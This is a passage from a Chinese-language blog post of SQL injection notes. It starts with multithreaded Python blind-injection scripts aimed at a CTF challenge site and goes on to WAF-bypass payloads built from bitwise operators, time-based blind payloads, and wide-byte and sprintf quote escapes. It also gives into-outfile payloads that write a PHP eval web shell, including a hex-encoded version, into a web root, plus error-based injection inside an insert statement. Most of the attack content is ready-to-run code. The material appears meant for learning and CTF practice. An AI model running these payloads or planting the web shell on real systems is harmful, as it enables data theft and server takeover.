        txt <span class="token operator">=</span> ses<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> true_state <span class="token keyword">in</span> txt<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>max <span class="token operator">-</span> <span class="token punctuation">(</span>min <span class="token operator">+</span> max<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
                asc <span class="token operator">=</span> max
                str <span class="token operator">+=</span> chr<span class="token punctuation">(</span>asc<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                min <span class="token operator">=</span> <span class="token punctuation">(</span>max <span class="token operator">+</span> min<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            max <span class="token operator">=</span> <span class="token punctuation">(</span>max <span class="token operator">+</span> min<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"database::%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面的脚本由于题目网络问题跑的有点慢，所以我加上了多线程, 速度提升明显，只是脚本依然丑陋</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/env python</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>

<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutor
<span class="token keyword">import</span> requests<span class="token punctuation">,</span> queue


<span class="token keyword">def</span> <span class="token function">payload</span><span class="token punctuation">(</span>rawstr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    newstr <span class="token operator">=</span> rawstr<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0x09</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">'Or'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 必须用chr 把16进制转化成字符'\t'</span>
    <span class="token keyword">return</span> newstr

url <span class="token operator">=</span> <span class="token string">'http://ctf5.shiyanbar.com/web/earnest/index.php'</span>
ses <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
true_state <span class="token operator">=</span> <span class="token string">'You are in'</span>

<span class="token comment" spellcheck="true"># database</span>

i <span class="token operator">=</span> <span class="token number">1</span>
raw <span class="token operator">=</span> <span class="token string">"0' or length(database())=%d or '0"</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    rawpay <span class="token operator">=</span> raw <span class="token operator">%</span> i
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">(</span>rawpay<span class="token punctuation">)</span><span class="token punctuation">}</span>
    txt <span class="token operator">=</span> ses<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> true_state <span class="token keyword">in</span> txt<span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">if</span> i <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'length error! please check your payload!'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"database.length:: %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>

q <span class="token operator">=</span> queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
length <span class="token operator">=</span> i
<span class="token keyword">def</span> <span class="token function">sqli</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    min <span class="token operator">=</span> <span class="token number">31</span>
    max <span class="token operator">=</span> <span class="token number">126</span>
    raw <span class="token operator">=</span> <span class="token string">"0' or (select ascii(mid( (select database() limit 1 offset 0) from %d)) > %d) or '0"</span>  <span class="token comment" spellcheck="true"># 可以不用for</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        rawpay <span class="token operator">=</span> raw <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">(</span>min <span class="token operator">+</span> max<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">(</span>rawpay<span class="token punctuation">)</span><span class="token punctuation">}</span>
        txt <span class="token operator">=</span> ses<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> true_state <span class="token keyword">in</span> txt<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>max <span class="token operator">-</span> <span class="token punctuation">(</span>min <span class="token operator">+</span> max<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
                asc <span class="token operator">=</span> max
                q<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> chr<span class="token punctuation">(</span>asc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                min <span class="token operator">=</span> <span class="token punctuation">(</span>max <span class="token operator">+</span> min<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            max <span class="token operator">=</span> <span class="token punctuation">(</span>max <span class="token operator">+</span> min<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>

<span class="token comment" spellcheck="true"># threads start</span>

threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">with</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
    executor<span class="token punctuation">.</span>map<span class="token punctuation">(</span>sqli<span class="token punctuation">,</span>range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#get result</span>

result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">while</span> <span class="token operator">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#sort</span>

<span class="token keyword">def</span> <span class="token function">get_zero</span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> ele<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
result<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>key <span class="token operator">=</span> get_zero<span class="token punctuation">)</span>

str <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    str <span class="token operator">+=</span> result<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"database::%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>位运算符和算术运算符注入(and or 被waf死) payload:</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token string">'0'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*括号绕过空格*/</span>
<span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">xor</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">xor</span><span class="token string">'0'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token string">'0'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'1'</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token string">'1'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'1'</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token string">'0'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'1'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">'1'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'1'</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token string">'1'</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>直接查询同一张表的字段</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token string">'0'</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">%</span><span class="token number">d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token string">'1'</span> <span class="token comment" spellcheck="true">/*uname和passwd是同一张表的两个字段*/</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="0x04-时间盲注（只有一种返回结果）"><a href="#0x04-时间盲注（只有一种返回结果）" class="headerlink" title="0x04 时间盲注（只有一种返回结果）"></a>0x04 时间盲注（只有一种返回结果）</h2><p>延迟：sleep,benchmark,heavy query（利用information_schema里的表做笛卡尔积运算，返回时间不稳定）</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">,</span> sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">,</span> benchmark<span class="token punctuation">(</span><span class="token number">1e7</span><span class="token punctuation">,</span>md5<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> A<span class="token punctuation">,</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> B<span class="token punctuation">,</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> C<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/*时间由columns的数量和服务器处理器性能等决定*/</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>过滤了逗号</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">case</span> <span class="token keyword">when</span> <span class="token number">2</span><span class="token operator">></span><span class="token number">1</span> <span class="token keyword">then</span> sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token number">1</span> <span class="token keyword">end</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>payload构造的时候注意and和or的短路性，sleep函数是否会被执行</p>
<pre class="line-numbers language-sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Empty <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">2.01</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Empty <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">or</span> sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">------+</span>
<span class="token operator">|</span> id   <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">------+</span>
<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">2.01</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">or</span> sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Empty <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">4.03</span> sec<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/*每条记录都会尝试匹配id*/</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Vinson404/p/7253255.html">上学期看的一篇绕过的总结，比较基础</a></p>
<h2 id="宽字节注入（转义单引号）"><a href="#宽字节注入（转义单引号）" class="headerlink" title="宽字节注入（转义单引号）"></a>宽字节注入（转义单引号）</h2><p>%bf匹配低位\，低位的范围中要含有0x5c编码<br>再加一个\构成\’ 使单引号逃逸</p>
<h2 id="sprintf逃逸单引号"><a href="#sprintf逃逸单引号" class="headerlink" title="sprintf逃逸单引号"></a>sprintf逃逸单引号</h2><p>在php里sprintf进行拼接的时候%后的内容为格式化类型，如果没有这个类型会输出空</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$input1</span> <span class="token operator">=</span> <span class="token string">"admin%1$' and 1=1#"</span><span class="token punctuation">;</span>
<span class="token variable">$input2</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
<span class="token variable">$input1</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$input1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$input2</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$input2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from %s where username = '$input1' and password='$input2';"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">sprintf</span><span class="token punctuation">(</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token string">"user"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//select * from user where username = 'admin' and 1=1#' and password='';</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/test404/p/7821884.html">sprintf格式化字符串带来的注入隐患</a></p>
<h1 id="load-file和outfile"><a href="#load-file和outfile" class="headerlink" title="load_file和outfile"></a>load_file和outfile</h1><h2 id="mysql常见的系统函数和变量"><a href="#mysql常见的系统函数和变量" class="headerlink" title="mysql常见的系统函数和变量"></a>mysql常见的系统函数和变量</h2><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 用户名<span class="token punctuation">,</span><span class="token keyword">current_user</span> 当前用户名<span class="token punctuation">,</span><span class="token keyword">session_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 连接数据库的用户名
@<span class="token variable">@hostname</span> 主机名<span class="token punctuation">,</span>@<span class="token variable">@port</span> 数据库端口<span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span> mysql数据库版本
@<span class="token variable">@version_compile_os</span> 操作系统<span class="token punctuation">,</span>@<span class="token variable">@datadir</span> 数据库绝对路径<span class="token punctuation">,</span>@<span class="token variable">@basedir</span> mysql绝对路径
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>测试读写权限</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">and</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span> <span class="token comment" spellcheck="true">--+</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="常见用途"><a href="#常见用途" class="headerlink" title="常见用途"></a>常见用途</h2><p>可以用来写一句话木马</p>
<pre class="line-numbers language-sql"><code class="language-sql">id <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> load_file <span class="token punctuation">(</span><span class="token string">'C:/1.bmp'</span><span class="token punctuation">)</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'C:/PHPstudy/WWW/1.php'</span> <span class="token comment" spellcheck="true">/*结合文件上传*/</span>
id <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token string">'&lt;?php @eval($_post[cmd])?>'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'C:/PHPstudy/WWW/1.php'</span><span class="token comment" spellcheck="true">/*直接写*/</span>
id <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">0x3c3f70687020406576616c28245f706f73745b636d645d293f3e</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'C:/PHPstudy/WWW/2.php'</span>
<span class="token comment" spellcheck="true">/*一句话可以换成16进制 outfile只能加单引号*/</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果想用load_file查看文件，特别是exe等可以00截断或者有回车换行的二进制文件时，最好用hex函数然后再转换回来，这样就不存在截断了</p>
<pre class="line-numbers language-sql"><code class="language-sql">id <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> hex<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token string">'C:/1.exe'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="outfile和dumpfile区别"><a href="#outfile和dumpfile区别" class="headerlink" title="outfile和dumpfile区别"></a>outfile和dumpfile区别</h2><ul>
<li>select * from admin into outfile ‘&#x2F;1.txt’; 可以完整导出每一行记录</li>
<li>而dumpfile只能导出一行数据</li>
<li>对于2进制文件，只能用dumpfile导出，它不对任何列或行进行终止，也不执行任何转义处理</li>
</ul>
<h1 id="其余操作"><a href="#其余操作" class="headerlink" title="其余操作"></a>其余操作</h1><h2 id="update-insert-re头-cookie注入"><a href="#update-insert-re头-cookie注入" class="headerlink" title="update,insert,re头,cookie注入"></a>update,insert,re头,cookie注入</h2><p>与数据库有交互且用户可以控制的地方都可能存在注入<br>demo</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> test <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'aa'</span><span class="token punctuation">,</span> <span class="token string">''</span> <span class="token operator">or</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*报错*/</span>
